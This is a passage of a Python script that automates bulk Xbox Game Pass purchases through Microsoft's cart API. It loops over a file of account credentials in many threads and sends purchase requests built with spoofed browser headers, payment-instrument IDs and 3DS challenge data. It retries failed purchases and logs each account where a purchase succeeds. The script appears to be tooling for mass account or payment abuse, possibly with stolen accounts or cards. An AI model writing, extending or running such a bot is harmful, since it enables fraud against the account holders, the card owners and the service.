		sprint("[-] Error while updating Cart", "y")
		return
	headers = {
	 'authority': 'cart.production.store-web.dynamics.com',
	 'accept': '*/*',
	 'accept-language': 'en-US,en;q=0.9',
	 'authorization': xbl_auth,
	 'content-type': 'application/json',
	 'ms-cv': generateHexStr(21) + "b.46.2",
	 'origin': 'https://www.microsoft.com',
	 'referer': 'https://www.microsoft.com/',
	 'sec-ch-ua-mobile': '?0',
	 'sec-ch-ua-platform': '"Windows"',
	 'sec-fetch-dest': 'empty',
	 'sec-fetch-mode': 'cors',
	 'sec-fetch-site': 'cross-site',
	 'user-agent': ua,
	 'x-authorization-muid': muid,
	 'x-ms-correlation-id': corId,
	 'x-ms-tracking-id': trackId,
	 'x-ms-vector-id': vectorId,
	}

	params = {
	 'appId': 'BuyNow',
	}

	json_data = {
	 'cartId': cartId,
	 'market': country_sm.upper(),
	 'locale': locale,
	 'catalogClientType': '',
	 'callerApplicationId': '_CONVERGED_XboxCom',
	 'clientContext': {
	  'client': 'XboxCom',
	  'deviceFamily': 'Web',
	 },
	 'paymentSessionId': ses_id,
	 'riskChallengeData': {
	  'type': 'threeds2',
	  'data': threedsId,
	 },
	 'paymentInstrumentId': pi_id,
	 'paymentInstrumentType': card_type,
	 'email': email,
	 'csvTopOffPaymentInstrumentId': None,
	 'billingAddressId': {
	  'accountId': akkuId,
	  'id': id_id,
	 },
	 'currentOrderState': 'CheckingOut',
	 'flights': purchaseFlights,
	 'itemsToAdd': {},
	}

	while True:
		try:
			response = s.post(
			 'https://cart.production.store-web.dynamics.com/cart/v1.0/Cart/purchase',
			 timeout=30,
			 params=params,
			 headers=headers,
			 json=json_data,
			)
			break
		except request_exceptions:
			continue
		except Exception as e:
			sprint(e, "r")
			return
	if not response.ok:
		sprint(f"[-] Failed to purchase Gamepass! " + email, "y")
		sprint(response.text, "c")
		sprint("[-] Retrying purchase", "y")
		response_retry = requests.post(
			 'https://cart.production.store-web.dynamics.com/cart/v1.0/Cart/purchase',
			 timeout=30,
			 params=params,
			 headers=headers,
			 json=json_data,
			)
		try:
			gand = response_retry.json()["cart"]["id"]
			sprint(response.text, "c")
			sprint(f"[+] Purchased Gamepass! " + str(email), "c")
			open("gamepass_accs.txt", "a").write(ms_creds + "\n")
			remove_content("accs.txt", ms_creds)
			return
		except:
			sprint(f"[-] Retry Failed! " + email, "y")
			sprint(response.text, "y")
			remove_content("accs.txt", ms_creds)
			return
		
	try:
		gand = response.json()["cart"]["id"]
		sprint(response.text, "c")
		sprint(f"[+] Purchased Gamepass! " + str(email), "c")
		open("gamepass_accs.txt", "a").write(ms_creds + "\n")
		remove_content("accs.txt", ms_creds)
	except:
		sprint(f"[-] Failed to purchase Gamepass! " + email, "y")
		sprint("Retrying in 10 seconds..." ,"y")
		time.sleep(10)
		response_retry = requests.post(
			 'https://cart.production.store-web.dynamics.com/cart/v1.0/Cart/purchase',
			 timeout=30,
			 params=params,
			 headers=headers,
			 json=json_data,
			)
		try:
			gand = response_retry.json()["cart"]["id"]
			sprint(response.text, "c")
			sprint(f"[+] Purchased Gamepass! " + str(email), "c")
			open("gamepass_accs.txt", "a").write(ms_creds + "\n")
			remove_content("accs.txt", ms_creds)
			return
		except:
			sprint(f"[-] Retry Failed! " + email, "y")
			sprint(response.text, "y")
			remove_content("accs.txt", ms_creds)
			return


colorama.init()
thread_count = int(input("> Threads: "))

if __name__ == "__main__":
	emails_list = open("accs.txt").read().splitlines()
	while len(emails_list) > 0:
		try:
			local_threads = []
			for x in range(thread_count):
				email = emails_list[0]
				start_thread = threading.Thread(target=main, args=(email,))
				local_threads.append(start_thread)
				start_thread.start()
				try:
					emails_list.pop(0)
				except:
					pass
			for thread in local_threads:
				thread.join()
		except IndexError:
			break
		except:
			pass

sprint("[-] Out of materials!", "y")
exit(0)
